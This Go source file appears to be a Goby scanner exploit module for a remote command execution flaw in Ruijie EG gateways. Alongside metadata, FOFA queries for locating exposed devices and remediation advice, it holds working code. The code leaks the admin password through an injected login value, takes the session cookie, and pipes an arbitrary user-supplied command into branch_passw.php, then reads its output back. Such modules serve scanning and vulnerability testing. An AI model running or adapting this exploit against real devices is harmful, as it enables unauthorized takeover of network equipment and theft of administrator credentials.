package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Ruijie EG branch_passw.php rce",
    "Description": "Attackers can use sandbox commands to obtain administrator account passwords, log in to the system, execute commands, and control the entire device.",
    "Impact": "Ruijie EG branch_passw.php rce",
    "Recommendation": "<p>1. Please contact the manufacturer to fix the vulnerability: <a href=\"http://www.ruijie.com.cn/\">http://www.ruijie.com. cn/</a></p><p>2. If it is not necessary, it is forbidden to access the device from the public network. </p><p>3. Set access policies and whitelist access through security devices such as firewalls. </p>",
    "Product": "Ruijie-EG",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "锐捷EG易网关后台命令执行Getshell",
            "Description": "锐捷睿易易网络路由产品线下的易网关采用全千兆电口，满足200兆ADSL光纤接入需求，兼容AC功能，可管理EAP系列AP，且支持易网络APP统一管理。该设备存在文件上传漏洞，任何人都可以通过锐捷EG易网关前台配合沙箱上传文件并Getshell，获取设备权限。",
            "Impact": "攻击者可使用沙箱命令获取管理员账号密码，登录系统，上传恶意文件并Getshell，获取vpn账号，监控内网流量，控制整个设备。",
            "Recommendation": "<p>1、请用户联系厂商修复漏洞：<a href=\"http://www.ruijie.com.cn/\" target=\"_blank\">http://www.ruijie.com.cn/</a></p><p>2、如非必要，禁止公网访问该设备。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Product": "Ruijie-EG易网关",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Ruijie EG branch_passw.php rce",
            "Description": "Attackers can use sandbox commands to obtain administrator account passwords, log in to the system, execute commands, and control the entire device.",
            "Impact": "Ruijie EG branch_passw.php rce",
            "Recommendation": "<p>1. Please contact the manufacturer to fix the vulnerability: <a href=\"http://www.ruijie.com.cn/\" target=\"_blank\">http://www.ruijie.com. cn/</a></p><p>2. If it is not necessary, it is forbidden to access the device from the public network. </p><p>3. Set access policies and whitelist access through security devices such as firewalls. </p>",
            "Product": "Ruijie-EG",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "(((body=\"ruijie\" && body=\"href=\\\"eg.css\") || body=\"product: ['锐捷网络有限公司 EG易网关\" || (body=\"webchat.ruijie.com.cn\" && body=\"main.htm\" && body=\"4008 111 000\" && body=\"www.ruijie.com.cn/service/know.aspx\")) && body!=\"Server: couchdb\") || (body=\"ruijie\" && body=\"href=\\\"eg.css\") || body=\"product: ['锐捷网络有限公司 EG易网关\" || (body=\"webchat.ruijie.com.cn\" && body=\"main.htm\" && body=\"4008 111 000\" && body=\"www.ruijie.com.cn/service/know.aspx\")",
    "GobyQuery": "(((body=\"ruijie\" && body=\"href=\\\"eg.css\") || body=\"product: ['锐捷网络有限公司 EG易网关\" || (body=\"webchat.ruijie.com.cn\" && body=\"main.htm\" && body=\"4008 111 000\" && body=\"www.ruijie.com.cn/service/know.aspx\")) && body!=\"Server: couchdb\") || (body=\"ruijie\" && body=\"href=\\\"eg.css\") || body=\"product: ['锐捷网络有限公司 EG易网关\" || (body=\"webchat.ruijie.com.cn\" && body=\"main.htm\" && body=\"4008 111 000\" && body=\"www.ruijie.com.cn/service/know.aspx\")",
    "Author": "itardc@163.com",
    "Homepage": "http://www.ruijie.com.cn/",
    "DisclosureDate": "2021-04-18",
    "References": [
        "http://fofa.so"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": [
            "Ruijie-EG"
        ]
    },
    "PocId": "10185"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewPostRequestConfig("/login.php")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Header.Store("X-Requested-With", "XMLHttpRequest")
			cfg.Data = "username=admin&password=admin?show+webmaster+user"
			password := ""
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil &&
				resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "admin") {
				result := regexp.MustCompile("admin (.*?)\"").FindStringSubmatch(resp.Utf8Html)
				log.Println(result)
				if len(result) > 1 {
					password = result[1]
				}
			}
			cfg.Data = "username=admin&password=" + password
			cookie := ""
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil &&
				resp.StatusCode == 200 && strings.Contains(resp.HeaderString.String(), "RUIJIEID") {
				log.Println(resp.HeaderString.Lines, resp.HeaderString.String(), resp.Header.Get("Set-Cookie"), resp.Cookie, resp.Cookies())
				cookie = resp.Cookie
			}
			cfg.URI = "/itbox_pi/branch_passw.php?a=set"
			cfg.Header.Store("Cookie", cookie)
			randomFilename := goutils.RandomHexString(8)
			randomFileContent := goutils.RandomHexString(8)
			cfg.Data = fmt.Sprintf("pass=|echo+'%s'>%s.txt", randomFileContent, randomFilename)
			httpclient.DoHttpRequest(u, cfg)
			if resp, err := httpclient.SimpleGet(u.FixedHostInfo + fmt.Sprintf("/itbox_pi/%s.txt", randomFilename)); err == nil {
				return strings.Contains(resp.Utf8Html, randomFileContent)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cfg := httpclient.NewPostRequestConfig("/login.php")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Header.Store("X-Requested-With", "XMLHttpRequest")
			cfg.Data = "username=admin&password=admin?show+webmaster+user"
			password := ""
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil &&
				resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "admin") {
				result := regexp.MustCompile("admin (.*?)\"").FindStringSubmatch(resp.Utf8Html)
				log.Println(result)
				if len(result) > 1 {
					password = result[1]
				}
			}
			cfg.Data = "username=admin&password=" + password
			cookie := ""
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil &&
				resp.StatusCode == 200 && strings.Contains(resp.HeaderString.String(), "RUIJIEID") {
				log.Println(resp.HeaderString.Lines, resp.HeaderString.String(), resp.Header.Get("Set-Cookie"), resp.Cookie, resp.Cookies())
				cookie = resp.Cookie
			}
			cfg.URI = "/itbox_pi/branch_passw.php?a=set"
			cfg.Header.Store("Cookie", cookie)
			randomFilename := goutils.RandomHexString(8)
			cmd := ss.Params["cmd"].(string)
			cfg.Data = fmt.Sprintf("pass=|%s>%s.txt", cmd, randomFilename)
			httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			if resp, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + fmt.Sprintf("/itbox_pi/%s.txt", randomFilename)); err == nil {
				expResult.Success = true
				expResult.Output = resp.Utf8Html
			}
			return expResult
		},
	))
}
